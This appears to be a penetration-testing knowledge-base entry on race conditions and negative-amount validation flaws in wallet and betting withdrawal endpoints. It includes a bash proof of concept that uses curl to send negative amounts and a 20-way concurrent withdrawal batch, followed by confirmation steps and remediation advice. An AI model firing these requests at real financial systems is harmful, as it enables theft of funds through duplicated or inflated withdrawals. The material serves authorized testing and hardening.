---
id: "race-condition-balance"
title: "Balance concurrency and negative values (race conditions / amount signs)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "critical"
cvss: 9
severity-basis: "cvss"
severity-note: null
product: "Custom wallet and betting endpoints"
versions: "Any"
ports: "80, 443"
keywords: "race, race condition, concurrent withdrawals, negative values, amount validation, idempotency"
entry: "20 concurrent copies of the same request / amount=-100"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic flaws; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- Withdrawal/betting/exchange/credit-transfer endpoints lack idempotency keys (no `requestId`/`nonce`), and balances use "read-then-write" updates.
- The frontend supplies the amount parameter: `{"amount":100}`; the server checks only "is the balance sufficient?"

## Prerequisites

- An authorized test account + a small balance; **before** concurrency testing, confirm that the site provides a member-side "cancel withdrawal/void transaction" endpoint (required for zero-exposure verification; see step 1).

## PoC

```bash
# 1) Start with low-exposure probes: negative / 0 / tiny values / scientific notation (without creating payout orders)
for amt in -100 -0.01 0 0.0001 1e-2; do   # 1e3=1000 is a valid positive value and creates a real large order; use the string "1e3" for type confusion
  curl -s -X POST https://target/api/withdraw/create \
    -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
    -d "{\"amount\":$amt,\"bankId\":1}" -o /dev/null -w "amount=$amt → %{http_code}\n"
done

#    Recheck order counts after probing: query list before and after; only unchanged n confirms "no payout orders created"
#    Positive control: submit +100 with the same balance; "insufficient balance" indicates only balance validation, not proof of missing sign validation

# 2) Concurrency: send the same withdrawal request 20 times concurrently in one batch (one account, minimum amount)—one batch only; no replay loops/sustained load testing
seq 20 | xargs -P 20 -I{} curl -s -o /dev/null -X POST https://target/api/withdraw/create \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
  -d '{"amount":10,"bankId":1}'
```

## Exploitation Steps

1. **Low exposure first**: a few individual negative/0/scientific-notation requests suffice to determine "whether the server validates amount signs and types," without creating payout orders. A response of "invalid amount" is the stated criterion for missing sign validation; if "insufficient balance" is returned, use a positive control to distinguish the cases.
2. Then test concurrency: record initial balance B0 and order count n0 → one batch of 20 concurrent requests → record B1, n1.
3. Confirmation (any one condition; use only one concurrent batch, since replay loops accumulate exposure and trigger risk alerts): `n1 - n0 ≥ 2` (multiple withdrawable orders created), ≥ 2 deductions in `B0 - B1` (balance deducted repeatedly), or a negative value increases the balance.
4. **Exposure = (n1 - n0) × per-order amount − the deduction that should actually apply**; immediately void extra orders using member-side "cancel withdrawal" (if no cancellation endpoint exists, **do not test concurrency**; use low-exposure negative-value/idempotency-repeat paths for evidence instead).
5. "Missing idempotency" can also be confirmed without moving funds: submit the same `requestId` twice; two 2xx responses each creating a record confirm it.
6. Evidence: B0/B1, n0/n1, request timestamps; test order numbers and voiding results.

## Remediation and Mitigation

### Remediation and Mitigation (Hardening)

- Idempotency keys (unique `requestId` index) + distributed locks.
- Use DB transactions with `SELECT ... FOR UPDATE` or optimistic locking via `version` for balance operations; deduct funds and create orders in the same transaction.
- Validate amounts server-side: positive, capped, two decimal places; reject scientific notation and string types.

## References

- OWASP WSTG-BUSL-04 (race conditions); OWASP Top 10 A04 Insecure Design.
